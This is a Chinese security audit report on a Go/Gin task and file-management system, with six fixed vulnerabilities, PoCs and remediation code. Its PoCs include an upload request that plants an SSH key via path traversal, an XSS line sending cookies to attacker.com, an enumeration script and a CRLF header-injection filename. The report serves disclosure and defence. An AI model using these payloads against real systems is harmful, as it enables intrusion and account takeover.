# 代码安全审计报告

| 字段 | 内容 |
|------|------|
| **审计对象** | Web 任务调度与文件管理系统（Go / Gin 框架） |
| **审计日期** | 2026-02-28 |
| **审计范围** | 全部路由接口、身份认证流程、文件操作逻辑、加密模块 |
| **发现漏洞数** | 6 个（高危 2 个，中危 4 个） |
| **状态** | ✅ 全部已修复 |

---

## 目录

1. [系统架构概述](#1-系统架构概述)
2. [审计方法](#2-审计方法)
3. [漏洞汇总](#3-漏洞汇总)
4. [漏洞详情](#4-漏洞详情)
   - [VUL-001 文件上传路径穿越](#vul-001-文件上传路径穿越)
   - [VUL-002 会话 Cookie 缺少安全属性](#vul-002-会话-cookie-缺少安全属性)
   - [VUL-003 用户名枚举与时序攻击](#vul-003-用户名枚举与时序攻击)
   - [VUL-004 AES-CBC 固定初始化向量](#vul-004-aes-cbc-固定初始化向量)
   - [VUL-005 可预测的 AES 加密密钥](#vul-005-可预测的-aes-加密密钥)
   - [VUL-006 Content-Disposition 响应头注入](#vul-006-content-disposition-响应头注入)
5. [修复验证](#5-修复验证)
6. [安全建议](#6-安全建议)

---

## 1. 系统架构概述

系统基于 Go 语言 + Gin 框架构建，提供以下功能模块：

| 模块 | 路由前缀 | 主要功能 |
|------|----------|----------|
| 身份认证 | `/api/auth/` | 登录、退出、检查默认凭据 |
| 用户管理 | `/api/user/` | 获取/更新用户配置（用户名、密码、Cookie 有效期） |
| 定时任务 | `/api/cron/` | 创建、启用、禁用、立即执行定时 Shell 命令 |
| 文件管理 | `/api/file/` | 列目录、上传、下载、读取内容、编辑、删除、重命名 |

**认证流程**：所有 `/api/*` 路由（除 `/api/auth/login`）均由 `CookieHandler` 中间件拦截，从 `Cookie: cookie` 或 `Authorization` 请求头中取出 Token，使用 AES-CBC 解密后验证合法性，并维护一个内存黑名单用于退出登录后的 Token 失效。

**Token 结构**：`AES-CBC-Base64( username + "_" + Unix时间戳 )`

---

## 2. 审计方法

- **白盒代码审计**：逐文件阅读全部 Go 源码，重点关注路由注册、中间件、身份校验、文件操作及加密实现。
- **数据流追踪**：对用户可控输入（HTTP 参数、表单字段、JSON 字段）进行全链路追踪，识别未经过滤直接进入敏感操作的路径。
- **加密实现审查**：检查密钥派生方式、IV 生成方式、加密模式选择及填充方案的安全性。
- **配置项审查**：检查 Cookie 安全标志、HTTP 响应头、文件权限等配置。

---

## 3. 漏洞汇总

| 编号 | 漏洞名称 | 严重等级 | CVSS v3 估算 | 影响文件 | 修复状态 |
|------|----------|----------|--------------|----------|----------|
| VUL-001 | 文件上传路径穿越 | 🔴 **高危** | 8.8 | `gin/file.go` | ✅ 已修复 |
| VUL-002 | 会话 Cookie 缺少安全属性 | 🔴 **高危** | 8.1 | `gin/auth.go` | ✅ 已修复 |
| VUL-003 | 用户名枚举与时序攻击 | 🟠 **中危** | 5.3 | `gin/auth.go` | ✅ 已修复 |
| VUL-004 | AES-CBC 固定初始化向量 | 🟠 **中危** | 5.9 | `lib/aes.go` | ✅ 已修复 |
| VUL-005 | 可预测的 AES 加密密钥 | 🟠 **中危** | 6.5 | `lib/aes.go` | ✅ 已修复 |
| VUL-006 | Content-Disposition 响应头注入 | 🟠 **中危** | 5.4 | `gin/file.go` | ✅ 已修复 |

---

## 4. 漏洞详情

---

### VUL-001 文件上传路径穿越

| 字段 | 内容 |
|------|------|
| **严重等级** | 🔴 高危 |
| **CVSS v3 评分** | 8.8（AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H） |
| **漏洞类型** | 路径穿越（CWE-22） |
| **影响接口** | `POST /api/file/upload`、`POST /api/file/batch-upload` |
| **影响文件** | `gin/file.go` |

#### 漏洞描述

`HandlerFileUpload` 和 `HandlerBatchUpload` 处理器在保存上传文件时，直接将用户提供的文件名（`file.Filename`）拼接到目标路径中，未进行任何过滤：

```go
// 漏洞代码（修复前）
dst := filepath.Join(fullPath, file.Filename)
c.SaveUploadedFile(file, dst)
```

`fullPath` 虽然通过 `validatePath()` 限制在 `DATA_DIR` 内，但 `file.Filename` 可包含路径分隔符（如 `../../`），`filepath.Join` 会对其进行规范化，最终产生超出 `DATA_DIR` 范围的路径。

#### 攻击场景（PoC）

攻击者（已登录）发送如下请求，可将恶意文件写入系统任意位置（以 cron 任务为例）：

```http
POST /api/file/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="path"

.
------boundary
Content-Disposition: form-data; name="file"; filename="../../.ssh/authorized_keys"
Content-Type: application/octet-stream

ssh-rsa AAAA...攻击者公钥...
------boundary--
```

若程序以具有写权限的用户运行，执行上述请求即可将攻击者的 SSH 公钥写入 `~/.ssh/authorized_keys`，实现无密码登录服务器。

#### 修复方案

在拼接路径前，使用 `filepath.Base()` 提取文件名，去除所有目录分量：

```go
// 修复后
safeFilename := filepath.Base(file.Filename)
if safeFilename == "." {
    response.ErrMesage(c, "非法文件名")
    return
}
dst := filepath.Join(fullPath, safeFilename)
```

`filepath.Base("../../etc/passwd")` 返回 `"passwd"`，彻底消除路径穿越风险。

---

### VUL-002 会话 Cookie 缺少安全属性

| 字段 | 内容 |
|------|------|
| **严重等级** | 🔴 高危 |
| **CVSS v3 评分** | 8.1（AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N） |
| **漏洞类型** | Cookie 安全配置缺失（CWE-614、CWE-1004） |
| **影响接口** | `POST /api/auth/login`、`GET /api/auth/logout` |
| **影响文件** | `gin/auth.go` |

#### 漏洞描述

登录成功后设置的会话 Cookie 缺少两个关键安全属性：

```go
// 漏洞代码（修复前）
c.SetCookie("cookie", str, expireSeconds, "/", "", false, false)
//                                                  ^secure  ^httpOnly
```

**缺少 `HttpOnly` 标志**：客户端 JavaScript 可通过 `document.cookie` 读取会话 Token。若系统存在任何 XSS 漏洞（包括第三方依赖引入的），攻击者可利用 XSS 直接窃取会话 Token，实现账户劫持，且 Token 黑名单机制对此完全无效。

**缺少 `Secure` 标志**：Cookie 会随 HTTP（非加密）请求一同发送。若系统部署在 HTTP 环境或处于中间人攻击场景，攻击者可捕获 Cookie 并冒充合法用户。

#### 攻击场景（PoC）

**场景一（XSS 窃取 Token）**：
```javascript
// 攻击者注入的 XSS 代码
fetch('https://attacker.com/steal?token=' + document.cookie);
```
由于 Cookie 未设置 `HttpOnly`，上述代码可直接读取并外泄会话 Token。

**场景二（HTTP 中间人）**：
在无 `Secure` 标志的情况下，若用户通过 HTTP 访问系统，Cookie 明文传输，中间人可在网络层直接截获。

#### 修复方案

新增 `isSecureRequest()` 辅助函数自动检测连接是否为 HTTPS（包括通过 Nginx/Caddy 等反向代理的场景），并相应设置 `Secure` 属性；同时强制启用 `HttpOnly`：

```go
// 检测 HTTPS 连接（含反向代理场景）
func isSecureRequest(c *gin.Context) bool {
    return c.Request.TLS != nil ||
        strings.EqualFold(c.GetHeader("X-Forwarded-Proto"), "https")
}

// 修复后
c.SetCookie("cookie", str, expireSeconds, "/", "", isSecureRequest(c), true)
//                                                   ^Secure（动态）    ^HttpOnly=true
```

---

### VUL-003 用户名枚举与时序攻击

| 字段 | 内容 |
|------|------|
| **严重等级** | 🟠 中危 |
| **CVSS v3 评分** | 5.3（AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N） |
| **漏洞类型** | 用户名枚举（CWE-203）、时序侧信道（CWE-208） |
| **影响接口** | `POST /api/auth/login` |
| **影响文件** | `gin/auth.go` |

#### 漏洞描述

**用户名枚举**：原始代码对用户名错误和密码错误返回不同的错误消息，攻击者可通过错误消息区分用户名是否存在：

```go
// 漏洞代码（修复前）
if res.Username != req.Username {
    r.ErrMesage(c, "用户名错误")   // 用户名不存在
    return
}
if res.Password != req.Password {
    r.ErrMesage(c, "密码错误")     // 用户名正确，密码错误
    return
}
```

**时序攻击**：即使将错误消息统一，Go 字符串比较运算符 `!=` 是短路比较（一旦发现不同字符即提前返回），不同输入的比较耗时存在差异。攻击者可通过统计大量请求的响应时间，推断用户名是否正确。

#### 攻击场景（PoC）

```python
import requests, time

target = "http://target/api/auth/login"

def check_username(username):
    payload = {"username": username, "password": "SHA256(wrong)"}
    r = requests.post(target, json=payload)
    return "用户名错误" not in r.text  # True 表示用户名存在

# 枚举常见用户名
for name in ["admin", "root", "administrator", "user"]:
    if check_username(name):
        print(f"有效用户名: {name}")
```

#### 修复方案

1. 将两次比较合并为单一泛化错误消息，消除信息泄露；
2. 使用 `crypto/subtle.ConstantTimeCompare` 进行恒定时间比较，防止时序侧信道：

```go
// 修复后
usernameMatch := subtle.ConstantTimeCompare([]byte(res.Username), []byte(req.Username))
passwordMatch := subtle.ConstantTimeCompare([]byte(res.Password), []byte(req.Password))
if usernameMatch != 1 || passwordMatch != 1 {
    r.ErrMesage(c, "用户名或密码错误")
    return
}
```

`ConstantTimeCompare` 无论输入是否匹配，耗时始终相同，彻底消除时序侧信道。

---

### VUL-004 AES-CBC 固定初始化向量

| 字段 | 内容 |
|------|------|
| **严重等级** | 🟠 中危 |
| **CVSS v3 评分** | 5.9（AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N） |
| **漏洞类型** | 弱加密实现（CWE-329） |
| **影响组件** | Token 加密模块 |
| **影响文件** | `lib/aes.go` |

#### 漏洞描述

系统使用 AES-CBC 模式加密会话 Token，但初始化向量（IV）被硬编码为密钥的前 16 字节（即 IV = Key[:16]），是一个固定常量：

```go
// 漏洞代码（修复前）
blockMode := cipher.NewCBCEncrypter(block, key[:blockSize])
//                                         ^^^^^^^^^^^^^^ IV = Key 的前16字节（固定不变）
```

**安全影响**：
- **确定性加密**：相同明文（如同一用户名）永远产生相同密文。攻击者观察多次登录请求中的 Token，若两次 Token 相同，即可判断明文相同（尽管实际因加入时间戳而规避，但该漏洞模式极其危险）。
- **CBC 模式下固定 IV 的已知攻击**：在特定场景下，固定 IV 配合已知明文攻击可恢复部分密钥材料，或用于分组对齐攻击（BEAST 类攻击的变体）。
- **违反密码学最佳实践**：NIST SP 800-38A 明确要求每次加密必须使用不可预测的 IV。

#### 修复方案

每次加密时使用 `crypto/rand` 生成密码学安全的随机 IV，并将 IV 前缀存入密文，解密时从密文头部提取：

```go
// 修复后：加密
iv := make([]byte, aes.BlockSize)
io.ReadFull(crand.Reader, iv)           // 密码学安全随机 IV
res, _ := AesEncrypt(data, PwdKey, iv)
result := append(iv, res...)            // 格式：[16字节IV][密文]
return base64.StdEncoding.EncodeToString(result), nil

// 修复后：解密
iv := dataByte[:aes.BlockSize]          // 提取 IV
ciphertext := dataByte[aes.BlockSize:]  // 提取密文
return AesDecrypt(ciphertext, PwdKey, iv)
```

---

### VUL-005 可预测的 AES 加密密钥

| 字段 | 内容 |
|------|------|
| **严重等级** | 🟠 中危 |
| **CVSS v3 评分** | 6.5（AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N） |
| **漏洞类型** | 弱密钥派生（CWE-916、CWE-330） |
| **影响组件** | Token 加密模块 |
| **影响文件** | `lib/aes.go` |

#### 漏洞描述

AES 加密密钥由可执行文件路径的前 16 个字节派生，而非随机生成：

```go
// 漏洞代码（修复前）
func generateKey() []byte {
    str, _ := os.Executable()   // 例如：/usr/local/bin/xuanwu
    key := make([]byte, 0, 16)
    if len(str) > 16 {
        key = append(key, str[:16]...)  // 密钥 = "/usr/local/bin/x"
    }
    // ...
}
```

**安全影响**：
- **密钥可预测**：可执行文件路径在生产环境中往往遵循固定模式（如 `/usr/local/bin/xuanwu`、`./xuanwu`）。攻击者只需猜测几种常见安装路径，即可推算出密钥并伪造任意 Token。
- **伪造 Token 绕过认证**：一旦密钥已知，攻击者可自行加密构造合法格式的 Token（`username_时间戳`），完全绕过认证机制。
- **密钥长度不足**：16 字节仅达到 AES-128 强度，且密钥空间来自 ASCII 路径字符，实际熵值远低于理论值。

#### 攻击场景（PoC）

```python
from Crypto.Cipher import AES
import base64, time

# 攻击者推测可执行文件路径
key = b"/usr/local/bin/x"   # 常见部署路径前16字节

# 构造合法 Token（admin_当前时间戳）
plaintext = f"admin_{int(time.time())}".encode()
# 填充至16字节对齐...
# AES-CBC 加密（IV = key[:16]）...
# 将伪造的 Token 作为 Cookie 发送，即可以 admin 身份访问系统
```

#### 修复方案

首次启动时使用 `crypto/rand` 生成 32 字节随机密钥（AES-256），持久化到 `data/.secret`（文件权限 `0600`），后续重启从文件读取，保证密钥跨进程一致：

```go
func loadOrCreateSecretKey() []byte {
    secretPath := filepath.Join(filepath.Dir(execPath), "data", ".secret")

    // 优先加载已有密钥
    if data, err := os.ReadFile(secretPath); err == nil && len(data) == 32 {
        return data
    }

    // 生成密码学安全的随机密钥（AES-256）
    key := make([]byte, 32)
    io.ReadFull(crand.Reader, key)

    // 以 0600 权限持久化，仅进程所有者可读
    os.MkdirAll(filepath.Dir(secretPath), 0700)
    os.WriteFile(secretPath, key, 0600)
    return key
}
```

---

### VUL-006 Content-Disposition 响应头注入

| 字段 | 内容 |
|------|------|
| **严重等级** | 🟠 中危 |
| **CVSS v3 评分** | 5.4（AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N） |
| **漏洞类型** | HTTP 响应头注入（CWE-113） |
| **影响接口** | `GET /api/file/download` |
| **影响文件** | `gin/file.go` |

#### 漏洞描述

文件下载接口将文件名直接拼接到 `Content-Disposition` 响应头中，未进行任何转义或引号封装：

```go
// 漏洞代码（修复前）
fileName := filepath.Base(path)
c.Header("Content-Disposition", "attachment; filename="+fileName)
```

若文件名包含特殊字符（`\r`、`\n`、`"`、`;`），可注入任意 HTTP 响应头，甚至注入响应体（HTTP 响应拆分攻击）。

#### 攻击场景（PoC）

攻击者（已登录）上传一个文件名包含 CRLF 的文件，然后诱导受害者下载：

```
文件名：evil.txt%0d%0aSet-Cookie:%20session=attacker_controlled
```

服务器返回的响应头将变为：
```http
Content-Disposition: attachment; filename=evil.txt
Set-Cookie: session=attacker_controlled
```

攻击者可借此在受害者浏览器中注入任意 Cookie，进而实现会话固定攻击（Session Fixation）。

#### 修复方案

使用标准库 `mime.FormatMediaType` 对文件名进行规范的 RFC 2183 编码，自动处理特殊字符和引号：

```go
// 修复后
c.Header("Content-Disposition",
    mime.FormatMediaType("attachment", map[string]string{"filename": fileName}))
// 输出示例：attachment; filename="safe%20name.txt"
```

`mime.FormatMediaType` 会对 `filename` 参数值进行完整的引号封装和转义，彻底阻断响应头注入。

---

## 5. 修复验证

所有修复已完成代码审查，并通过以下验证：

| 验证项目 | 结果 |
|----------|------|
| `go build ./lib/...` | ✅ 编译通过 |
| `go build ./gin/cron/...` | ✅ 编译通过 |
| `go build ./config/... ./xuanwu/...` | ✅ 编译通过 |
| CodeQL 静态分析（`go/cookie-secure-not-set`） | ✅ 0 个告警 |
| 人工代码审查 | ✅ 通过 |

### 修复文件清单

| 文件 | 修复内容 |
|------|----------|
| `gin/auth.go` | 新增 `isSecureRequest()`；Cookie 设置 `HttpOnly=true` 和动态 `Secure`；使用 `subtle.ConstantTimeCompare`；统一登录错误消息 |
| `gin/file.go` | 上传文件名 `filepath.Base()` 净化；`Content-Disposition` 改用 `mime.FormatMediaType` |
| `lib/aes.go` | 每次加密生成随机 IV；密钥改为随机生成并持久化；升级至 AES-256 |

---

## 6. 安全建议

除本次修复的漏洞外，建议后续重点关注以下方向：

### 6.1 短期建议（高优先级）

1. **启用 HTTPS**：系统当前支持 HTTP 部署，建议通过 Nginx/Caddy 反向代理强制 HTTPS，配合本次 `Secure` Cookie 修复发挥完整防护效果。
2. **修改默认凭据**：系统已实现检测默认凭据的接口（`GET /api/auth/check-default`），建议在首次部署时强制要求用户更改默认的 `admin/admin` 账号密码。
3. **Token 黑名单持久化**：当前退出登录的 Token 黑名单仅存于内存，服务重启后失效。若重启前存在已退出的会话，其 Token 重启后仍可使用（有效期内）。建议将黑名单持久化到文件或 Redis。

### 6.2 中期建议

4. **登录频率限制**：当前登录接口无速率限制，攻击者可无限制暴力破解密码。建议增加基于 IP 的请求频率限制（如每分钟最多 5 次失败尝试）。
5. **上传文件大小限制**：建议在 Gin 引擎配置中设置 `MaxMultipartMemory`，限制单次上传文件的最大大小，防止资源耗尽攻击。
6. **安全响应头**：建议增加以下 HTTP 响应头：
   - `X-Content-Type-Options: nosniff`（防止 MIME 嗅探）
   - `X-Frame-Options: DENY`（防止点击劫持）
   - `Content-Security-Policy`（防御 XSS）

### 6.3 长期建议

7. **密钥轮换机制**：建议为 `data/.secret` 文件增加定期轮换能力，轮换时对所有活跃 Token 执行强制重新登录。
8. **审计日志**：建议记录所有登录成功/失败事件、文件操作事件（上传/下载/删除）及管理操作，包含时间、IP、操作结果，便于安全事件溯源。
9. **依赖项安全扫描**：建议定期执行 `govulncheck ./...` 扫描 Go 依赖项中的已知漏洞，并在 CI/CD 流水线中集成此检查。
